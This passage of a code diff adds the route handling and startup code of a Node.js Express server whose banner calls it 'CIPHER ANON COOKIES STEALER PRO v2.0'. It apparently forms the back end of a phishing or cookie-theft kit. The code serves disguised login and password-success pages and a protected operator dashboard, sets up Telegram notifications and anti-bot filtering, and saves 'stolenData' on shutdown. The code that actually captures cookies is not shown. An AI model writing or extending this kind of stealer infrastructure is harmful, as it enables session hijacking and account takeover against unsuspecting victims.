+    try {
+        fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
+    } catch (e) {}
+
+    log('[+] Telegram config updated');
+    res.json({ status: 'ok', message: 'Telegram settings updated successfully' });
+});
+
+// ============================================================
+// STATIC FILES — AFTER API ROUTES
+// ============================================================
+
+// ---- Serve .php files ----
+app.get('*.php', (req, res, next) => {
+    const filePath = path.join(__dirname, 'public', req.path);
+    if (fs.existsSync(filePath)) {
+        res.setHeader('Content-Type', 'text/html; charset=utf-8');
+        res.sendFile(filePath);
+    } else {
+        const basePath = filePath.replace(/\.php$/, '');
+        if (fs.existsSync(basePath)) {
+            res.setHeader('Content-Type', 'text/html; charset=utf-8');
+            res.sendFile(basePath);
+        } else {
+            next();
+        }
+    }
+});
+
+app.use(express.static('public', {
+    index: false,
+    setHeaders: (res, filePath) => {
+        if (filePath.endsWith('.html')) {
+            return res.status(404).send('Not Found');
+        }
+        if (filePath.endsWith('.php')) {
+            res.setHeader('Content-Type', 'text/html; charset=utf-8');
+        }
+        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+    }
+}));
+
+// ---- Home ----
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'home.php'));
+});
+
+// ---- Login Page ----
+app.get('/login.php', (req, res) => {
+    if (req.session && req.session.authenticated) {
+        return res.redirect('/dashboard');
+    }
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.sendFile(path.join(__dirname, 'public', 'login.php'));
+});
+
+// ---- Password Success ----
+app.get('/password-success.php', (req, res) => {
+    if (req.session) {
+        req.session.destroy(() => {
+            res.setHeader('Content-Type', 'text/html; charset=utf-8');
+            res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
+        });
+    } else {
+        res.setHeader('Content-Type', 'text/html; charset=utf-8');
+        res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
+    }
+});
+
+// ---- Protected Dashboard ----
+app.get('/dashboard', requireAuth, (req, res) => {
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
+});
+
+// ============================================================
+// 404 HANDLER
+// ============================================================
+
+app.use((req, res) => {
+    if (req.path.startsWith('/api')) {
+        res.status(404).json({ status: 'error', message: 'API endpoint not found' });
+    } else {
+        res.status(404).send('Not Found');
+    }
+});
+
+// ============================================================
+// START SERVER
+// ============================================================
+
+app.listen(PORT, () => {
+    console.log('\n' + '='.repeat(55));
+    console.log('  🍪 CIPHER ANON COOKIES STEALER PRO v2.0');
+    console.log('='.repeat(55));
+    console.log(`  [+] Server: http://localhost:${PORT}`);
+    console.log(`  [+] Login: http://localhost:${PORT}/login.php`);
+    console.log(`  [+] Home: http://localhost:${PORT}/home.php`);
+    console.log(`  [+] Dashboard: http://localhost:${PORT}/dashboard`);
+    console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
+    console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
+    console.log(`  [+] Session Timeout: 30 minutes`);
+    console.log(`  [+] Dedup: IP + hostname, 60s window`);
+    console.log(`  [+] Anti-Bot: ENABLED ✅`);
+    console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
+    console.log('='.repeat(55) + '\n');
+});
+
+// ============================================================
+// GRACEFUL SHUTDOWN
+// ============================================================
+
+process.on('SIGINT', () => {
+    console.log('\n[!] Saving data...');
+    saveData(DATA_FILE, stolenData);
+    saveData(TRASH_FILE, trashData);
+    process.exit(0);
+});
+
+process.on('SIGTERM', () => {
+    console.log('\n[!] Saving data...');
+    saveData(DATA_FILE, stolenData);
+    saveData(TRASH_FILE, trashData);
+    process.exit(0);
+});
+
+module.exports = app;
